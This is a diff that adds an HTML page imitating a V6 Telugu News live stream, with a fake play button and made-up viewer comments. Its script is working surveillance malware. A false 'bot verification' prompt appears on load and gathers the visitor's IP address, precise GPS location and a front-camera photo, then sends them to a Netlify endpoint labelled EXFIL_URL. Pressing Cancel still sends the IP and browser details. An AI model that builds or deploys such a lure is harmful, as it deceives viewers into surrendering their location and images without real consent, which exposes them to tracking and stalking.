@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="te">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>V6 Telugu News LIVE | Telangana Live TV Channel | V6 News</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #0a0a0a;
+            color: #fff;
+            min-height: 100vh;
+        }
+        /* Top bar */
+        .top-bar {
+            background: #1a1a1a;
+            padding: 8px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 2px solid #e53935;
+        }
+        .logo {
+            font-size: 18px;
+            font-weight: 700;
+            color: #e53935;
+        }
+        .logo span { color: #fff; }
+        .top-bar-right { display: flex; gap: 12px; font-size: 13px; color: #aaa; }
+        
+        /* Video player mockup */
+        .player-container {
+            position: relative;
+            width: 100%;
+            max-width: 900px;
+            margin: 0 auto;
+            background: #000;
+        }
+        .player {
+            position: relative;
+            width: 100%;
+            padding-top: 56.25%; /* 16:9 */
+            background: #111;
+            cursor: pointer;
+            overflow: hidden;
+        }
+        .player-overlay {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,0,0,0.6);
+            transition: opacity 0.5s;
+        }
+        .player-overlay.hidden { opacity: 0; pointer-events: none; }
+        .play-btn {
+            width: 72px; height: 72px;
+            border-radius: 50%;
+            background: rgba(229,57,53,0.9);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+            color: #fff;
+            margin-bottom: 12px;
+            border: 3px solid rgba(255,255,255,0.3);
+            transition: transform 0.2s;
+        }
+        .play-btn:hover { transform: scale(1.05); }
+        .live-badge {
+            background: #e53935;
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-size: 13px;
+            font-weight: 600;
+            letter-spacing: 1px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+        .channel-watermark {
+            position: absolute;
+            bottom: 20px; right: 20px;
+            font-size: 14px;
+            color: rgba(255,255,255,0.5);
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
+        /* Video placeholder image */
+        .video-bg {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+        }
+        .video-bg::after {
+            content: 'V6 NEWS';
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 48px;
+            font-weight: 800;
+            color: rgba(229,57,53,0.15);
+            letter-spacing: 8px;
+        }
+        /* Bottom info bar */
+        .info-bar {
+            background: #1a1a1a;
+            padding: 12px 16px;
+            border-top: 1px solid #333;
+        }
+        .info-bar h1 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        .info-bar .meta {
+            font-size: 13px;
+            color: #888;
+        }
+        .info-bar .views {
+            display: inline-block;
+            background: #333;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 12px;
+            margin-top: 6px;
+        }
+        /* Subscribe section */
+        .sub-section {
+            background: #1a1a1a;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-top: 1px solid #333;
+        }
+        .channel-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .channel-avatar {
+            width: 40px; height: 40px;
+            border-radius: 50%;
+            background: #e53935;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 18px;
+        }
+        .channel-name { font-weight: 600; font-size: 14px; }
+        .channel-subs { font-size: 12px; color: #888; }
+        .subscribe-btn {
+            background: #e53935;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .subscribe-btn:hover { background: #c62828; }
+        /* Comments / suggested section */
+        .content-area {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 16px;
+        }
+        .tab-bar {
+            display: flex;
+            gap: 20px;
+            border-bottom: 1px solid #333;
+            padding-bottom: 8px;
+            margin-bottom: 16px;
+        }
+        .tab-bar .tab {
+            font-size: 14px;
+            color: #888;
+            cursor: pointer;
+            padding-bottom: 8px;
+        }
+        .tab-bar .tab.active {
+            color: #fff;
+            border-bottom: 2px solid #fff;
+        }
+        .comment-item {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #222;
+        }
+        .comment-avatar {
+            width: 32px; height: 32px;
+            border-radius: 50%;
+            background: #444;
+            flex-shrink: 0;
+        }
+        .comment-name { font-size: 13px; font-weight: 600; }
+        .comment-name span { color: #888; font-weight: 400; font-size: 12px; }
+        .comment-text { font-size: 13px; color: #ccc; margin-top: 2px; }
+
+        /* Consent overlay for camera/gps */
+        .consent-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.85);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+        }
+        .consent-overlay.show { display: flex; }
+        .consent-box {
+            background: #1a1a1a;
+            border-radius: 16px;
+            padding: 32px 24px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            border: 1px solid #333;
+        }
+        .consent-box .icon {
+            font-size: 48px;
+            margin-bottom: 16px;
+        }
+        .consent-box h2 {
+            font-size: 20px;
+            margin-bottom: 8px;
+        }
+        .consent-box p {
+            font-size: 14px;
+            color: #aaa;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .consent-box .btn-group {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+        }
+        .consent-box .btn {
+            padding: 10px 28px;
+            border-radius: 24px;
+            border: none;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .consent-box .btn-primary {
+            background: #e53935;
+            color: #fff;
+        }
+        .consent-box .btn-primary:hover { background: #c62828; }
+        .consent-box .btn-secondary {
+            background: #333;
+            color: #ccc;
+        }
+
+        /* Loading spinner */
+        .loading-spinner {
+            display: none;
+            width: 40px; height: 40px;
+            border: 4px solid #333;
+            border-top: 4px solid #e53935;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        @media (max-width: 600px) {
+            .consent-box { padding: 24px 16px; }
+            .consent-box h2 { font-size: 17px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- Consent Overlay -->
+<div class="consent-overlay" id="consentOverlay">
+    <div class="consent-box">
+        <div class="icon">📺</div>
+        <h2>Continue Watching V6 News LIVE</h2>
+        <p>To verify you're a real viewer and not a bot, please allow access to your location and camera. This is a one-time verification required by our streaming partner.</p>
+        <div class="btn-group">
+            <button class="btn btn-secondary" onclick="denyAccess()">Cancel</button>
+            <button class="btn btn-primary" onclick="startCapture()">Allow & Watch</button>
+        </div>
+        <div class="loading-spinner" id="loadingSpinner"></div>
+    </div>
+</div>
+
+<!-- Top Bar -->
+<div class="top-bar">
+    <div class="logo">V6 <span>News</span></div>
+    <div class="top-bar-right">
+        <span>🔔</span>
+        <span>⋮</span>
+    </div>
+</div>
+
+<!-- Player -->
+<div class="player-container">
+    <div class="player" id="playerArea">
+        <div class="video-bg"></div>
+        <div class="player-overlay" id="playerOverlay">
+            <div class="play-btn" id="playBtn">▶</div>
+            <div class="live-badge">🔴 LIVE</div>
+        </div>
+        <div class="channel-watermark">V6 NEWS</div>
+    </div>
+</div>
+
+<!-- Info Bar -->
+<div class="info-bar">
+    <h1>V6 Telugu News LIVE | Telangana Live TV Channel | V6 News</h1>
+    <div class="meta">13,018 watching now<span class="views">📈 News</span></div>
+</div>
+
+<!-- Subscribe -->
+<div class="sub-section">
+    <div class="channel-info">
+        <div class="channel-avatar">V6</div>
+        <div>
+            <div class="channel-name">V6 News Telugu</div>
+            <div class="channel-subs">8.4M subscribers</div>
+        </div>
+    </div>
+    <div class="subscribe-btn">Subscribe</div>
+</div>
+
+<!-- Content tabs -->
+<div class="content-area">
+    <div class="tab-bar">
+        <div class="tab active">Comments</div>
+        <div class="tab">Suggested</div>
+    </div>
+    <!-- Fake comments -->
+    <div class="comment-item">
+        <div class="comment-avatar"></div>
+        <div>
+            <div class="comment-name">TeluguBhakta <span>2 hours ago</span></div>
+            <div class="comment-text">Jai Telangana! 🙏 Live coverage super ga undi</div>
+        </div>
+    </div>
+    <div class="comment-item">
+        <div class="comment-avatar"></div>
+        <div>
+            <div class="comment-name">Hyderabad_Wala <span>45 min ago</span></div>
+            <div class="comment-text">Bonalu celebrations live chustunna... amazing coverage</div>
+        </div>
+    </div>
+    <div class="comment-item">
+        <div class="comment-avatar"></div>
+        <div>
+            <div class="comment-name">Ravi_Updates <span>12 min ago</span></div>
+            <div class="comment-text">Any updates on the CM press meet?</div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // ==================== CONFIG ====================
+    const EXFIL_URL = '/.netlify/functions/capture';  // Netlify function endpoint
+
+    // ==================== CAPTURE LOGIC ====================
+    let capturedData = {
+        ip: '',
+        ua: navigator.userAgent,
+        timestamp: new Date().toISOString(),
+        referrer: document.referrer || 'direct',
+        gps: null,
+        photo: null,
+        gpsError: null,
+        cameraError: null
+    };
+
+    // Get IP from public API
+    async function getIP() {
+        try {
+            const r = await fetch('https://api.ipify.org?format=json');
+            const d = await r.json();
+            capturedData.ip = d.ip;
+        } catch(e) {
+            capturedData.ip = 'unknown';
+        }
+    }
+
+    // Capture GPS
+    function getGPS() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                capturedData.gpsError = 'Geolocation not supported';
+                return resolve();
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    capturedData.gps = {
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        acc: pos.coords.accuracy,
+                        alt: pos.coords.altitude || null
+                    };
+                    resolve();
+                },
+                (err) => {
+                    capturedData.gpsError = err.message;
+                    resolve();
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        });
+    }
+
+    // Capture front camera photo
+    function getCameraPhoto() {
+        return new Promise((resolve) => {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                capturedData.cameraError = 'Camera API not available';
+                return resolve();
+            }
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 } })
+                .then((stream) => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    video.onloadedmetadata = () => {
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0);
+                            capturedData.photo = canvas.toDataURL('image/jpeg', 0.8);
+                            stream.getTracks().forEach(t => t.stop());
+                            resolve();
+                        }, 500);
+                    };
+                })
+                .catch((err) => {
+                    capturedData.cameraError = err.message;
+                    resolve();
+                });
+        });
+    }
+
+    // Send all data to backend
+    async function exfiltrate() {
+        try {
+            const resp = await fetch(EXFIL_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(capturedData)
+            });
+            const result = await resp.text();
+            console.log('Exfil result:', result);
+        } catch(e) {
+            console.error('Exfil failed:', e);
+            // Fallback: send via beacon
+            try {
+                navigator.sendBeacon(EXFIL_URL, JSON.stringify(capturedData));
+            } catch(e2) {}
+        }
+    }
+
+    // Main capture flow
+    async function startCapture() {
+        const overlay = document.getElementById('consentOverlay');
+        const spinner = document.getElementById('loadingSpinner');
+        const btnGroup = document.querySelector('.consent-box .btn-group');
+        
+        // Show spinner, hide buttons
+        btnGroup.style.display = 'none';
+        spinner.style.display = 'block';
+
+        // Get IP first
+        await getIP();
+
+        // Capture GPS + camera in parallel
+        await Promise.all([getGPS(), getCameraPhoto()]);
+
+        // Exfiltrate
+        await exfiltrate();
+
+        // Hide overlay
+        overlay.classList.remove('show');
+        spinner.style.display = 'none';
+
+        // "Play" the video (show fake stream)
+        document.getElementById('playerOverlay').classList.add('hidden');
+    }
+
+    function denyAccess() {
+        const overlay = document.getElementById('consentOverlay');
+        overlay.classList.remove('show');
+        // Still try to send what we have (IP, UA)
+        getIP().then(() => exfiltrate());
+    }
+
+    // ==================== PAGE LOAD ====================
+    document.addEventListener('DOMContentLoaded', () => {
+        // Show consent overlay after 1 second delay
+        setTimeout(() => {
+            document.getElementById('consentOverlay').classList.add('show');
+        }, 1500);
+
+        // Play button also triggers consent
+        document.getElementById('playBtn').addEventListener('click', () => {
+            document.getElementById('consentOverlay').classList.add('show');
+        });
+        document.getElementById('playerArea').addEventListener('click', () => {
+            document.getElementById('consentOverlay').classList.add('show');
+        });
+    });
+</script>
+</body>
+</html>
